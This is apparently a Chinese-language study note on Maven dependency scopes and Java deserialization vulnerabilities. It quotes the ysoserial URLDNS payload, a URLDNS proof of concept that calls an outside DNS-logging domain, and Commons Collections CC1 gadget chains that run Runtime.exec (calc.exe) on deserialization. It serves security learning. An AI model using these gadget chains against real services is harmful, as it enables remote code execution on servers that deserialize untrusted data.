引入依赖存在一个范围，maven的依赖范围包括： `compile`，`provide`，`runtime`，`test`，`system`。

*   **compile**：表示编译范围，指 A 在编译时依赖 B，该范围为**默认依赖范围**。编译范围的依赖会用在编译，测试，运行，由于运行时需要，所以编译范围的依赖会被打包。
*   **provided**：provied 依赖只有当 jdk 或者一个容器已提供该依赖之后才使用。provide 依赖在编译和测试时需要，在运行时不需要。例如：servlet api被Tomcat容器提供了。
*   **runtime**：runtime 依赖在运行和测试系统时需要，但在编译时不需要。例如：jdbc 的驱动包。由于运行时需要，所以 runtime 范围的依赖会被打包。
*   **test**：test 范围依赖在编译和运行时都不需要，只在测试编译和测试运行时需要。例如：Junit。由于运行时不需要，所以 test 范围依赖不会被打包。
*   **system**：system 范围依赖与 provide 类似，但是必须显示的提供一个对于本地系统中 jar 文件的路径。一般不推荐使用。

![image-20231101142904364](daydayup.assets/image-20231101142904364.png)

命令

- clean：清理
- compile：编译
- test：运行测试
- package：打包

![image-20231101143856438](daydayup.assets/image-20231101143856438.png)

> maven项目的项目目录
> ![img](daydayup.assets/20201204225021484.png)

### 反序列化

#### Java中的反序列化

Java 序列化是把Java对象转换为字节序列的过程；而Java反序列化是把字节序列恢复为Java对象的过程。

与PHP不同的是，Java序列化转化的字节序列不是明文，和Python序列化的数据一样不能够直接可读。

要使一个Java对象可序列化，需要满足以下条件：

1. 类必须实现`java.io.Serializable`接口，该接口是一个标记接口，没有任何方法。
2. 所有非序列化的字段必须标记为`transient`关键字，表示不参与序列化。

`Serializable`用来标识当前类可以被`ObjectOutputStream`序列化，以及被`ObjectInputStream`反序列化。

序列化与反序列化当中有两个 **"特别特别特别特别特别"**重要的方法 ————`writeObject`和`readObject`。这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。

![image-20231101144356805](daydayup.assets/image-20231101144356805.png)

只要服务端反序列化数据，客户端传递类的`readObject`中代码会自动执行，基于攻击者在服务器上运行代码的能力。所以从根本上来说，Java 反序列化的漏洞的与`readObject`有关。

实例：

```java
import java.io.*;

class Person implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }
}

public class SerializationExample {
    public static void main(String[] args) {
        // 序列化对象
        Person person = new Person("John", 30);
        try {
            FileOutputStream fileOut = new FileOutputStream("person.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(person);
            out.close();
            fileOut.close();
            System.out.println("Serialized data is saved in person.ser");
        } catch (IOException e) {
            e.printStackTrace();
        }

        // 反序列化对象
        Person deserializedPerson = null;
        try {
            FileInputStream fileIn = new FileInputStream("person.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            deserializedPerson = (Person) in.readObject();
            in.close();
            fileIn.close();
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }

        if (deserializedPerson != null) {
            System.out.println("Deserialized data:");
            System.out.println("Name: " + deserializedPerson.getName());
            System.out.println("Age: " + deserializedPerson.getAge());
        }
    }
}

```

#### URLDNS调用链

[ysoserial/src/main/java/ysoserial/payloads/URLDNS.java at master · frohoff/ysoserial (github.com)](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)

```Java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

先看`HashMap`的`readObject`方法，下面调用了`hash`方法，传入了`key`参数
![image-20231101145008714](daydayup.assets/image-20231101145008714.png)

>`readObject()`方法首先调用`s.defaultReadObject()`来读取默认的序列化字段。然后调用`reinitialize()`方法来重新初始化HashMap对象。
>
>接下来，代码读取和忽略了一些字段，如阈值、负载因子、桶的数量等。
>
>然后，代码读取并解析了HashMap中的键值对的数量，并根据读取到的数量和负载因子计算出了HashMap的容量和阈值。
>
>接着，代码使用`SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap)`来检查数组的类型和长度是否合法。
>
>然后，代码创建了一个新的Node数组作为HashMap的存储结构，并将其赋值给`table`字段。
>
>最后，代码使用循环读取键值对，并通过调用`putVal()`方法将键值对放入HashMap中。
>
>需要注意的是，这段代码是HashMap类的内部实现细节，用于在反序列化时恢复HashMap对象的状态。正常情况下，我们不需要直接调用这个方法，而是通过使用`ObjectInputStream`的`readObject()`方法来自动调用。
>
>这个示例代码展示了如何在自定义的`readObject()`方法中完成HashMap的反序列化过程，并恢复HashMap对象的状态。

`hash`方法里面调用了`key`的`hashCode()`方法
![image-20231101145303743](daydayup.assets/image-20231101145303743.png)


而`URL`类的`hashCode`方法会调用到`URLStreamHandler`类的`hashCode`方法
![image-20231101145559503](daydayup.assets/image-20231101145559503.png)


`URLStreamHandler`类的`hashCode`方法会调用`getHostAddress`方法，该方法会获取本地主机的IP地址。如果主机字段为空或DNS解析失败，将返回null。
![image-20231101145845836](daydayup.assets/image-20231101145845836.png)

![image-20231101150014925](daydayup.assets/image-20231101150014925.png)

所以，将`URL`类当做`HashMap`的`key`，让其进入`readObject`后调用`hash`方法传入`URL`，然后通过调用`URL`的`HashCode`到`URLStreamHandler`类的`hashCode`方法，最后调用`getHostAddress`方法。

poc

```java
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class urldns {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {
//        urlPoc uu = new urlPoc("https://25693.5M7O9BPTY2.dns.xms.la");
//        uu.serUrlDns();
        urlPoc.unserUrlDns();
    }
}
class urlPoc {
    private URL url;
    private HashMap map;

    public urlPoc(String u) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException, NoSuchFieldException {
        Class mapClass = HashMap.class;
        this.map = (HashMap)mapClass.getConstructor().newInstance();

        this.url = new URL(u);

        map.put(url, "1");

        Field hashcode = url.getClass().getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url, -1);
    }

    public void serUrlDns() throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
        out.writeObject(this.map);
    }

    public static void unserUrlDns() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("urldns.ser"));
        HashMap hashmap = (HashMap) in.readObject();
        System.out.println("unser urldns");
    }
}
```

![image-20231106200108684](daydayup.assets/image-20231106200108684.png)

#### cc1

先分析一个Java安全漫谈中最简单的cc链

maven添加依赖

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
```

poc

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class cc01 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(
                        "exec", 
                        new Class[]{String.class}, 
                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
                ),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

`Transformer`是一个接口，`TransformedMap`在转换Map的新元素时，就会调⽤`transform`⽅法
![image-20231107150708714](daydayup.assets/image-20231107150708714.png)

`ConstantTransformer`是接口`Transformer`的实现类，在构造函数的时候传入一个实例，在调用`transform`方法时将其返回
![image-20231107150832842](daydayup.assets/image-20231107150832842.png)

`InvokerTransformer`是接口`Transformer`的实现类，在构造函数的时候传进来方法名称、参数类型和参数，在调⽤`transform`⽅法时传入对象`input`，然后调用`input`的对应的方法。
![image-20231107151124522](daydayup.assets/image-20231107151124522.png)

`ChainedTransformer`能够将一个`Transformer`数组连成串，挨个调用其中的`transform`方法
![image-20231107153557268](daydayup.assets/image-20231107153557268.png)

`TransformedMap` 可以用于在将值放入或获取值出来时，对其进行转换，对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。

```Java
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
// outerMap就是修饰过后的map，innerMap就是要进行修饰的map，第二个参数是对key进行修饰的Transformers，第三个参数是对value进行修饰的Transformers。
```

![image-20231107154433255](daydayup.assets/image-20231107154433255.png)

这样触发命令执行的地方就很明显了，当向`outerMap`里添加元素的时候，会调用`Transformer`数组里的方法，也就是调用`Runtime`的`exec`方法执行命令，将其进行反序列化后会报错，因为`Runtime`没法进行序列化，所以需要用到反射来进行序列化。

poc

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class cc01 {
    public static void main(String[] args) throws Exception {
//        Runtime demo =(Runtime) Runtime.class.getMethod("getRuntime").invoke(null);
//        sercc01();
        unsercc01();
    }
    
    public static void sercc01() throws IOException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{
                                String.class,
                                Class[].class
                        },
                        new Object[]{
                                "getRuntime",
                                null
                        }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {
                                Object.class,
                                Object[].class
                        },
                        new Object[] {
                                null,
                                null
                        }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
                ),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        // outerMap就是修饰过后的map，innerMap就是要进行修饰的map
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./serDemo/cc01.ser"));
        out.writeObject(outerMap);
    }

    public static void unsercc01() throws IOException, ClassNotFoundException {
            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./serDemo/cc01.ser"));
            Map hashmap = (Map) in.readObject();
            hashmap.put("test", "xxxx");
            System.out.println("unser cc01");
    }

}
```

